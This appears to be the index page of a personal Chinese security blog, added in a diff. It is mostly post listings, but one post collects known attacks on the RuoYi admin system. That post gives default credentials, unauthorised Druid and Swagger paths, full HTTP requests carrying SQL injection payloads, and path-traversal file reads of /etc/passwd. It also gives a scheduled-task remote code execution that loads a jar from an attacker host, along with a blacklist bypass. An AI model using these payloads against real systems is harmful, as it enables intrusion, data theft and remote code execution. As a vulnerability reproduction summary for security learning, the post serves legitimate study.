@@ -1,0 +1,728 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>zJ4sun</title>
+<meta name="description" content="行胜于言">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="shortcut icon" href="https://jasunzhang.github.io//favicon.ico?v=1730379565557">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="stylesheet" href="https://unpkg.com/papercss@1.6.1/dist/paper.min.css" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://jasunzhang.github.io//styles/main.css">
+
+
+<script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+
+
+  </head>
+  <body>
+    <nav class="navbar border fixed split-nav">
+  <div class="nav-brand">
+    <h3><a href="https://jasunzhang.github.io/">zJ4sun</a></h3>
+  </div>
+  <div class="collapsible">
+    <input id="collapsible1" type="checkbox" name="collapsible1">
+    <button>
+      <label for="collapsible1">
+        <div class="bar1"></div>
+        <div class="bar2"></div>
+        <div class="bar3"></div>
+      </label>
+    </button>
+    <div class="collapsible-body">
+      <ul class="inline">
+        
+          <li>
+            
+              <a href="/" class="menu">
+                首页
+              </a>
+            
+          </li>
+        
+          <li>
+            
+              <a href="/archives" class="menu">
+                归档
+              </a>
+            
+          </li>
+        
+          <li>
+            
+              <a href="/tags" class="menu">
+                标签
+              </a>
+            
+          </li>
+        
+          <li>
+            
+              <a href="/post/about" class="menu">
+                关于
+              </a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+
+    <div id="top" class="row site">
+      <div class="sm-12 md-8 col">
+        <div class="paper">
+          
+  <article class="article">
+    <h2 class="article-title">
+      <a href="https://jasunzhang.github.io/post/ruo-kou-ling-zong-jie/">弱口令总结</a>
+    </h2>
+    <p class="article-meta">
+      2024-10-30
+      
+    </p>
+    <p class="text-lead">
+      
+    </p>
+    <div class="row">
+      <a href="https://jasunzhang.github.io/post/ruo-kou-ling-zong-jie/" class="readmore-link">
+        <button>
+          Read More
+        </button>
+      </a>
+    </div>
+  </article>
+
+  <article class="article">
+    <h2 class="article-title">
+      <a href="https://jasunzhang.github.io/post/2024-nian-di-san-ji-du-zong-jie/">2024年第三季度总结</a>
+    </h2>
+    <p class="article-meta">
+      2024-09-30
+      
+        <a href="https://jasunzhang.github.io/tag/Mt6wUAkn1/" class="badge secondary">
+          quarter总结
+        </a>
+      
+        <a href="https://jasunzhang.github.io/tag/EjyP2cHMk/" class="badge ">
+          live生活
+        </a>
+      
+    </p>
+    <p class="text-lead">
+      
+    </p>
+    <div class="row">
+      <a href="https://jasunzhang.github.io/post/2024-nian-di-san-ji-du-zong-jie/" class="readmore-link">
+        <button>
+          Read More
+        </button>
+      </a>
+    </div>
+  </article>
+
+  <article class="article">
+    <h2 class="article-title">
+      <a href="https://jasunzhang.github.io/post/ruoyi-lou-dong-he-ji/">Ruoyi漏洞合集</a>
+    </h2>
+    <p class="article-meta">
+      2024-09-28
+      
+        <a href="https://jasunzhang.github.io/tag/ZtS9EorEb/" class="badge secondary">
+          web安全之路
+        </a>
+      
+    </p>
+    <p class="text-lead">
+      <h2 id="前言">前言</h2>
+<p>许多国产的系统用若依的比较多，自己对于这个系统一直没有比较明确的思路，所以这次专门总结一下一些常见手法，许多内容来自网上各个师傅的分享，本文写自2024年9月</p>
+<h2 id="正文">正文</h2>
+<h3 id="若依系统简介">若依系统简介</h3>
+<p>若依管理系统（Ruoyi Admin System）是一款基于Java开发的开源后台管理系统，旨在提供一个快速开发和部署企业级管理系统的解决方案。若依管理系统采用前后端分离架构，前端使用Vue.js框架，后端使用Spring Boot框架。<a href="https://gitee.com/y_project/RuoYi">官网地址</a></p>
+<h3 id="可能启用的服务">可能启用的服务</h3>
+<p>使用了若依可能存在一些其他的服务，可以配套使用，多种方法尝试。</p>
+<pre><code>Alibaba Druid: Druid 是一个数据库连接池，通常与数据库服务一起使用，Druid 提供监控和扩展功能，通常配置在应用服务器中
+Alibaba Nacos: Nacos 是一个服务发现和配置管理工具。默认端口为8848（HTTP），客户端gRPC端口默认为9848，服务端gRPC端口默认为9849，Jraft请求服务端端口默认为7848 
+Spring: Spring Boot 经典白页报错页面，曾哥工具扫
+Redis: Redis 默认端口为6379，可以通过配置文件或启动命令参数修改 
+MySQL: MySQL 数据库服务的默认端口为3306 
+MinIO: MinIO 是一个高性能的对象存储服务。默认端口为9000（API）和9001（控制台），但可以在启动时通过命令行参数修改 
+fastjson
+shiro
+swagger-ui.html
+mybatis
+</code></pre>
+<h3 id="识别">识别</h3>
+<p>若依最经典的特征肯定就是这个纯色界面白色圈圈，以及正在加载系统资源，请耐心等待</p>
+<figure data-type="image" tabindex="1"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202409301117749.png" alt="image-20240930111706693" loading="lazy"></figure>
+<p>这两个小草也是一个比较明显的特征，但是很多会改icon，所以这个是一个判断标准</p>
+<figure data-type="image" tabindex="2"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202409301123151.png" alt="image-20240930112317132" loading="lazy"></figure>
+<h3 id="前台">前台</h3>
+<h4 id="弱口令">弱口令</h4>
+<p>前台的话首先想到的是弱口令，这里可以尝试</p>
+<pre><code>用户：admin ruoyi druid
+密码：123456 admin druid admin123 admin888
+其中admin:admin123、ry:admin123比较常见
+</code></pre>
+<p>弱口令尝试一下就行，弱口令现在越来越少了，同时若依的前端漏洞特别少</p>
+<p>Druid 经典弱口令：ruoyi/123456 admin/123456</p>
+<h4 id="若依前台默认shiro-key命令执行漏洞">若依前台默认shiro key命令执行漏洞</h4>
+<p>若依默认使用shiro组件，所以可以试试shiro经典的反序列化 rememberMe漏洞来getshell。</p>
+<p>使用工具<a href="https://github.com/SummerSec/ShiroAttack2">shiro_attack-4.7.0-SNAPSHOT-all</a>目前我还没成功过</p>
+<h3 id="未授权">未授权</h3>
+<h4 id="druid未授权">druid未授权</h4>
+<p>这里主要是看看druid的未授权看看能不能套出点session点啥的。</p>
+<p>这里的session记录的是不管是登陆成功的、没登陆成功的，还是失效的都会储存在这里。如果我们利用泄露的session进行url爆破可能就能将该漏洞的性质从低危转向高危。js 下面有个 app.xxxxxx(一些个字母数字).js，直接里面搜</p>
+<p>baseurl 就有了，有的是全的 url，大多数是只给个 baseurl：prod-api，这类的拼接就好。之后在接口后拼接</p>
+<figure data-type="image" tabindex="3"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202409301953371.png" alt="image-20240930195311333" loading="lazy"></figure>
+<p>一些经典的路径</p>
+<pre><code>/druid/index.html
+/druid/login.html
+/prod-api/druid/login.html
+/prod-api/druid/index.html
+/dev-api/druid/login.html
+/dev-api/druid/index.html
+/api/druid/login.html
+/api/druid/index.html
+/admin/druid/login.html
+/admin-api/druid/login.html
+</code></pre>
+<p>在 URI 监控中存在大量接口路径，可通过未授权获取更多敏感信息在 session 中可获取历史最近的 session 值，可用 session 进行替换实现登录系统。新版本的若依系统的cookie值是Admin-Token值且是JWT编码的，老版本的，就是jsessionid值</p>
+<figure data-type="image" tabindex="4"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202409301953803.png" alt="image-20240930195356766" loading="lazy"></figure>
+<h4 id="swagger-未授权在接口后面拼接经典路径">Swagger 未授权：在接口后面拼接经典路径：</h4>
+<pre><code>/swagger-ui/index.html /v2/api-docs
+/v3/api-docs
+</code></pre>
+<h3 id="后台">后台</h3>
+<p>拿到工具后直接可以先用自动化工具去扫一扫有没有一些nday<a href="http://wiki.ms08067.com:5244/%E8%BD%AF%E4%BB%B6%E7%AE%A1%E5%AE%B6/Ruoyi-All/%E8%8B%A5%E4%BE%9D%E6%BC%8F%E6%B4%9E%E7%BB%BC%E5%90%88%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7/ruoyiVuln.rar">自动化工具</a></p>
+<h4 id="若依后台存在多处sql注入漏洞">若依后台存在多处sql注入漏洞</h4>
+<p>进入后台后，拦截角色管理页面的请求包<br>
+<img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202409302010907.png" alt="img" loading="lazy"><br>
+POC：</p>
+<pre><code class="language-makefile">POST /system/role/list HTTP/1.1
+Host: 127.0.0.1
+Content-Length: 179
+sec-ch-ua: &quot;Chromium&quot;;v=&quot;109&quot;, &quot;Not_A Brand&quot;;v=&quot;99&quot;
+Accept: application/json, text/javascript, */*; q=0.01
+Content-Type: application/x-www-form-urlencoded
+X-Requested-With: XMLHttpRequest
+sec-ch-ua-mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
+sec-ch-ua-platform: &quot;Windows&quot;
+Origin: http://127.0.0.1
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://127.0.0.1/system/role
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: o0At_2132_saltkey=JW6Gt2hb; o0At_2132_lastvisit=1691240426; o0At_2132_ulastactivity=2db4EUfD9WS50eLvnip%2B9TxK2ZhcO65vPL0dA6sPVF8AQSBMa6Qn; JSESSIONID=cfcf2d1f-f180-46cf-98bb-5eacc4206014
+Connection: close
+
+pageSize=&amp;pageNum=&amp;orderByColumn=&amp;isAsc=&amp;roleName=&amp;roleKey=&amp;status=&amp;params[beginTime]=&amp;params[endTime]=&amp;params[dataScope]=and extractvalue(1,concat(0x7e,(select database()),0x7e))
+</code></pre>
+<p><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202409302010118.png" alt="img" loading="lazy"><br>
+第二个sql注入点：角色编辑接口<br>
+POC:</p>
+<pre><code class="language-makefile">POST /system/dept/edit HTTP/1.1
+Host: 127.0.0.1
+Content-Length: 111
+sec-ch-ua: &quot;Chromium&quot;;v=&quot;109&quot;, &quot;Not_A Brand&quot;;v=&quot;99&quot;
+Accept: application/json, text/javascript, */*; q=0.01
+Content-Type: application/x-www-form-urlencoded
+X-Requested-With: XMLHttpRequest
+sec-ch-ua-mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
+sec-ch-ua-platform: &quot;Windows&quot;
+Origin: http://127.0.0.1
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://127.0.0.1/system/role
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: o0At_2132_saltkey=JW6Gt2hb; o0At_2132_lastvisit=1691240426; o0At_2132_ulastactivity=2db4EUfD9WS50eLvnip%2B9TxK2ZhcO65vPL0dA6sPVF8AQSBMa6Qn; JSESSIONID=cfcf2d1f-f180-46cf-98bb-5eacc4206014
+Connection: close
+
+DeptName=1&amp;DeptId=100&amp;ParentId=12&amp;Status=0&amp;OrderNum=1&amp;ancestors=0)or(extractvalue(1,concat((select user()))));#
+</code></pre>
+<p><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202409302010893.png" alt="img" loading="lazy"><br>
+第三个sql注入点POC：</p>
+<pre><code class="language-makefile">POST /system/role/export HTTP/1.1
+Host: 127.0.0.1
+Content-Length: 75
+sec-ch-ua: &quot;Chromium&quot;;v=&quot;109&quot;, &quot;Not_A Brand&quot;;v=&quot;99&quot;
+Accept: application/json, text/javascript, */*; q=0.01
+Content-Type: application/x-www-form-urlencoded
+X-Requested-With: XMLHttpRequest
+sec-ch-ua-mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
+sec-ch-ua-platform: &quot;Windows&quot;
+Origin: http://127.0.0.1
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://127.0.0.1/system/role
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: o0At_2132_saltkey=JW6Gt2hb; o0At_2132_lastvisit=1691240426; o0At_2132_ulastactivity=2db4EUfD9WS50eLvnip%2B9TxK2ZhcO65vPL0dA6sPVF8AQSBMa6Qn; JSESSIONID=cfcf2d1f-f180-46cf-98bb-5eacc4206014
+Connection: close
+
+params[dataScope]=and extractvalue(1,concat(0x7e,(select database()),0x7e))
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202409302010901.png" alt="img" loading="lazy"></figure>
+<h3 id="ruoyi475版本后台sql注入">RuoYi4.7.5版本后台sql注入</h3>
+<p>ruoyi-4.7.5 后台 com/ruoyi/generator/controller/GenController 下/tool/gen/createTable路由存在sql注入。<br>
+POC：</p>
+<pre><code class="language-sql">sql=CREATE table ss1 as SELECT/**/* FROM sys_job WHERE 1=1 union/**/SELECT/**/extractvalue(1,concat(0x7e,(select/**/version()),0x7e));
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202409302010230.png" alt="img" loading="lazy"></figure>
+<h3 id="若依后台任意文件读取cnvd-2021-01931">若依后台任意文件读取（CNVD-2021-01931）</h3>
+<h4 id="漏洞简介">漏洞简介</h4>
+<p>若依管理系统是基于springboot的权限管理系统，登录后台后可以读取服务器上的任意文件。影响版本：RuoYi&lt;4.5.1</p>
+<h4 id="漏洞复现">漏洞复现</h4>
+<p>POC:<br>
+<code>/common/download/resource?resource=/profile/../../../../etc/passwd</code><br>
+<code>/common/download/resource?resource=/profile/../../../../Windows/win.ini</code><br>
+<img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202409302010880.png" alt="img" loading="lazy"><br>
+读取了D盘下的1.txt文件</p>
+<h3 id="若依后台定时任务rce有工具">若依后台定时任务RCE（有工具）</h3>
+<h4 id="漏洞简介-2">漏洞简介</h4>
+<p>由于若依后台计划任务处，对于传入的“调用目标字符串”没有任何校验，导致攻击者可以调用任意类、方法及参数触发反射执行命令。影响版本：RuoYi&lt;4.6.2</p>
+<h4 id="漏洞复现-2">漏洞复现</h4>
+<p>下载payload：https://github.com/artsploit/yaml-payload<br>
+下载完成之后我们修改一下 AwesomeScriptEngineFactory.java 这个文件<br>
+<img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202409302010389.png" alt="img" loading="lazy"><br>
+(mspaint为打开画图板)<br>
+然后切换到yaml-payload-master目录<br>
+编写yaml-payload.yml文件（如果没有自己创建）<br>
+<img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202409302010395.png" alt="img" loading="lazy"><br>
+然后在该目录下执行以下命令进行编译(java环境使用的是1.8)</p>
+<pre><code class="language-cpp">javac src/artsploit/AwesomeScriptEngineFactory.java　　　　//编译java文件
+jar -cvf yaml-payload.jar -C src/ .　　　　　　　　　　　　　//打包成jar包
+</code></pre>
+<p>然后就会生成一个 yaml-payload.jar的jar包<br>
+直接在yaml-payload-master目录下使用python起一个http服务。<br>
+<code>python3 -m http.server 5555</code><br>
+然后进入若依后台，添加一个计划任务。<br>
+<code>org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;http://攻击机ip/yaml-payload.jar&quot;]]]]')</code><br>
+<img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202409302010490.png" alt="img" loading="lazy"><br>
+cron表达式：<br>
+<code>0/10 * * * * ?</code><br>
+这个cron就跟linux定时任务一样,定义每天/每周/等,定时启动的时间<br>
+配置好之后,并不会启动定时任务<br>
+<img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202409302010499.png" alt="img" loading="lazy"><br>
+计划任务启动之后，即可执行命令mspaint(弹出画图板)<br>
+<img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202409302010850.png" alt="img" loading="lazy"></p>
+<h3 id="版本462ruoyi472">版本4.6.2&lt;=Ruoyi&lt;4.7.2</h3>
+<p>这个版本采用了黑名单限制调用字符串</p>
+<ul>
+<li>定时任务屏蔽ldap远程调用</li>
+<li>定时任务屏蔽http(s)远程调用</li>
+<li>定时任务屏蔽rmi远程调用<br>
+<img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202409302010706.png" alt="img" loading="lazy"><br>
+ypass<br>
+咱们只需要在屏蔽的协议加上单引号,接着采用之前的方式<br>
+例如:<br>
+<code>org.yaml.snakeyaml.Yaml.load(‘!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [“h’t’t’p’://127.0.0.1:88/yaml-payload.jar”]]]]’)</code><br>
+加引号<br>
+<img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202409302010890.png" alt="img" loading="lazy"><br>
+注：这个绕过没有亲自测试，粘贴的一位师傅原图</li>
+</ul>
+<h3 id="若依后台任意文件下载漏洞">若依后台任意文件下载漏洞</h3>
+<h4 id="漏洞简介-3">漏洞简介</h4>
+<p>若依管理系统后台存在任意文件下载漏洞。影响版本：若依管理系统4.7.6及以下版本</p>
+<h4 id="漏洞复现-3">漏洞复现</h4>
+<p>漏洞利用前提：登录进后台。<br>
+首先提交一个定时任务。</p>
+<pre><code class="language-makefile">POST /monitor/job/add HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-CA,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 188
+Connection: close
+Cookie: o0At_2132_saltkey=JW6Gt2hb; o0At_2132_lastvisit=1691240426; o0At_2132_ulastactivity=2db4EUfD9WS50eLvnip%2B9TxK2ZhcO65vPL0dA6sPVF8AQSBMa6Qn; JSESSIONID=61e79ae9-8cdd-4e51-baac-d269ef551df3
+
+createBy=admin&amp;jobName=renwu&amp;jobGroup=DEFAULT&amp;invokeTarget=ruoYiConfig.setProfile('c://windows/win.ini')&amp;cronExpression=0%2F15+*+*+*+*+%3F&amp;misfirePolicy=1&amp;concurrent=1&amp;status=0&amp;remark=
+</code></pre>
+<p><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202409302010881.png" alt="img" loading="lazy"><br>
+通过浏览器直接get请求以下地址即可，下载任意文件。</p>
+<pre><code class="language-ruby">http://127.0.0.1/common/download/resource?resource=c://windows/win.ini:.zip
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202409302010955.png" alt="img" loading="lazy"></figure>
+<h2 id="参考">参考</h2>
+<p><a href="https://xz.aliyun.com/t/15124?time__1311=GqjxuQD%3DomqDqGXYYK0%3DDOfe5ubRaiT4D">针对若依系统nday的常见各种姿势</a></p>
+<p><a href="https://www.cnblogs.com/pursue-security/p/17658404.html">Ruoyi框架漏洞复现总结 </a></p>
+<p><a href="https://www.cnblogs.com/wavewindsor/p/17880329.html">RuoYi--------漏洞复现</a></p>
+
+    </p>
+    <div class="row">
+      <a href="https://jasunzhang.github.io/post/ruoyi-lou-dong-he-ji/" class="readmore-link">
+        <button>
+          Read More
+        </button>
+      </a>
+    </div>
+  </article>
+
+  <article class="article">
+    <h2 class="article-title">
+      <a href="https://jasunzhang.github.io/post/python-pa-chong-xue-xi-bi-ji/">python爬虫学习笔记</a>
+    </h2>
+    <p class="article-meta">
+      2024-09-23
+      
+        <a href="https://jasunzhang.github.io/tag/qXZ0OLIUJ/" class="badge ">
+          python脚册
+        </a>
+      
+    </p>
+    <p class="text-lead">
+      
+    </p>
+    <div class="row">
+      <a href="https://jasunzhang.github.io/post/python-pa-chong-xue-xi-bi-ji/" class="readmore-link">
+        <button>
+          Read More
+        </button>
+      </a>
+    </div>
+  </article>
+
+  <article class="article">
+    <h2 class="article-title">
+      <a href="https://jasunzhang.github.io/post/githubgridea-pei-zhi-ge-ren-bo-ke-wu-fa-jia-zai-maincss-wen-ti/">github+gridea配置个人博客无法加载main.css问题</a>
+    </h2>
+    <p class="article-meta">
+      2024-07-22
+      
+        <a href="https://jasunzhang.github.io/tag/EJT8wG8lz/" class="badge warning">
+          setting环境设置
+        </a>
+      
+    </p>
+    <p class="text-lead">
+      
+    </p>
+    <div class="row">
+      <a href="https://jasunzhang.github.io/post/githubgridea-pei-zhi-ge-ren-bo-ke-wu-fa-jia-zai-maincss-wen-ti/" class="readmore-link">
+        <button>
+          Read More
+        </button>
+      </a>
+    </div>
+  </article>
+
+  <article class="article">
+    <h2 class="article-title">
+      <a href="https://jasunzhang.github.io/post/2024-nian-di-er-ji-du-zong-jie/">2024年第二季度总结</a>
+    </h2>
+    <p class="article-meta">
+      2024-06-30
+      
+        <a href="https://jasunzhang.github.io/tag/Mt6wUAkn1/" class="badge secondary">
+          quarter总结
+        </a>
+      
+        <a href="https://jasunzhang.github.io/tag/EjyP2cHMk/" class="badge success">
+          live生活
+        </a>
+      
+    </p>
+    <p class="text-lead">
+      
+    </p>
+    <div class="row">
+      <a href="https://jasunzhang.github.io/post/2024-nian-di-er-ji-du-zong-jie/" class="readmore-link">
+        <button>
+          Read More
+        </button>
+      </a>
+    </div>
+  </article>
+
+  <article class="article">
+    <h2 class="article-title">
+      <a href="https://jasunzhang.github.io/post/xuan-ji-ba-chang-apcahe-ri-zhi-fen-xi/">玄机靶场-apcahe日志分析</a>
+    </h2>
+    <p class="article-meta">
+      2024-05-22
+      
+    </p>
+    <p class="text-lead">
+      
+    </p>
+    <div class="row">
+      <a href="https://jasunzhang.github.io/post/xuan-ji-ba-chang-apcahe-ri-zhi-fen-xi/" class="readmore-link">
+        <button>
+          Read More
+        </button>
+      </a>
+    </div>
+  </article>
+
+  <article class="article">
+    <h2 class="article-title">
+      <a href="https://jasunzhang.github.io/post/xuan-ji-ba-chang-linux-ri-zhi-fen-xi/">玄机靶场-Linux日志分析</a>
+    </h2>
+    <p class="article-meta">
+      2024-05-21
+      
+        <a href="https://jasunzhang.github.io/tag/ApJiA0cW4/" class="badge success">
+          Emergency响应
+        </a>
+      
+    </p>
+    <p class="text-lead">
+      
+    </p>
+    <div class="row">
+      <a href="https://jasunzhang.github.io/post/xuan-ji-ba-chang-linux-ri-zhi-fen-xi/" class="readmore-link">
+        <button>
+          Read More
+        </button>
+      </a>
+    </div>
+  </article>
+
+  <article class="article">
+    <h2 class="article-title">
+      <a href="https://jasunzhang.github.io/post/dnslog-wai-dai/">dnslog外带</a>
+    </h2>
+    <p class="article-meta">
+      2024-05-08
+      
+        <a href="https://jasunzhang.github.io/tag/ZtS9EorEb/" class="badge success">
+          web安全之路
+        </a>
+      
+    </p>
+    <p class="text-lead">
+      
+    </p>
+    <div class="row">
+      <a href="https://jasunzhang.github.io/post/dnslog-wai-dai/" class="readmore-link">
+        <button>
+          Read More
+        </button>
+      </a>
+    </div>
+  </article>
+
+  <article class="article">
+    <h2 class="article-title">
+      <a href="https://jasunzhang.github.io/post/chang-jian-webshell-gong-ju-mu-ma-te-zheng-fen-xi/">常见webshell工具木马特征分析</a>
+    </h2>
+    <p class="article-meta">
+      2024-05-07
+      
+        <a href="https://jasunzhang.github.io/tag/ApJiA0cW4/" class="badge warning">
+          Emergency响应
+        </a>
+      
+    </p>
+    <p class="text-lead">
+      
+    </p>
+    <div class="row">
+      <a href="https://jasunzhang.github.io/post/chang-jian-webshell-gong-ju-mu-ma-te-zheng-fen-xi/" class="readmore-link">
+        <button>
+          Read More
+        </button>
+      </a>
+    </div>
+  </article>
+
+
+        </div>
+        
+        <div class="row flex-edges">
+  
+  
+    <a href="https://jasunzhang.github.io/page/2" class="paper-btn">
+      下一页
+    </a>
+  
+</div>
+
+      </div>
+      
+      <div class="sm-12 md-4 col sidebar">
+  <div class="paper info-container">
+    <img src="https://jasunzhang.github.io//images/avatar.png?v=1730379565557" class="no-responsive avatar">
+    <div class="text-muted">行胜于言</div>
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  </div>
+  <div class="paper">
+    <div class="sidebar-title">
+      最新文章
+    </div>
+    <div class="row">
+      <ul>
+        
+          
+            <li>
+              <a href="https://jasunzhang.github.io/post/ruo-kou-ling-zong-jie/">弱口令总结</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://jasunzhang.github.io/post/2024-nian-di-san-ji-du-zong-jie/">2024年第三季度总结</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://jasunzhang.github.io/post/ruoyi-lou-dong-he-ji/">Ruoyi漏洞合集</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://jasunzhang.github.io/post/python-pa-chong-xue-xi-bi-ji/">python爬虫学习笔记</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://jasunzhang.github.io/post/githubgridea-pei-zhi-ge-ren-bo-ke-wu-fa-jia-zai-maincss-wen-ti/">github+gridea配置个人博客无法加载main.css问题</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://jasunzhang.github.io/post/2024-nian-di-er-ji-du-zong-jie/">2024年第二季度总结</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://jasunzhang.github.io/post/xuan-ji-ba-chang-apcahe-ri-zhi-fen-xi/">玄机靶场-apcahe日志分析</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://jasunzhang.github.io/post/xuan-ji-ba-chang-linux-ri-zhi-fen-xi/">玄机靶场-Linux日志分析</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://jasunzhang.github.io/post/dnslog-wai-dai/">dnslog外带</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://jasunzhang.github.io/post/chang-jian-webshell-gong-ju-mu-ma-te-zheng-fen-xi/">常见webshell工具木马特征分析</a>
+            </li>
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      </ul>
+    </div>
+  </div>
+  <div class="paper">
+    <div class="sidebar-title">
+      标签列表
+    </div>
+    <div class="row">
+      
+        <a href="https://jasunzhang.github.io/tag/Mt6wUAkn1/" class="badge secondary">
+          quarter总结
+        </a>
+      
+        <a href="https://jasunzhang.github.io/tag/EjyP2cHMk/" class="badge success">
+          live生活
+        </a>
+      
+        <a href="https://jasunzhang.github.io/tag/ZtS9EorEb/" class="badge secondary">
+          web安全之路
+        </a>
+      
+        <a href="https://jasunzhang.github.io/tag/qXZ0OLIUJ/" class="badge secondary">
+          python脚册
+        </a>
+      
+        <a href="https://jasunzhang.github.io/tag/EJT8wG8lz/" class="badge warning">
+          setting环境设置
+        </a>
+      
+        <a href="https://jasunzhang.github.io/tag/ApJiA0cW4/" class="badge secondary">
+          Emergency响应
+        </a>
+      
+        <a href="https://jasunzhang.github.io/tag/4KkPHXGCg/" class="badge success">
+          job实习项目
+        </a>
+      
+        <a href="https://jasunzhang.github.io/tag/1Wpns8h4a/" class="badge secondary">
+          vulnhub打靶
+        </a>
+      
+    </div>
+  </div>
+  <div class="paper">
+    Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://jasunzhang.github.io//atom.xml" target="_blank">RSS</a>
+  </div>
+</div>
+
+    </div>
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+
+<script type="application/javascript">
+
+AOS.init();
+
+hljs.initHighlightingOnLoad()
+
+</script>
+
+
+
+
+  </body>
+</html>
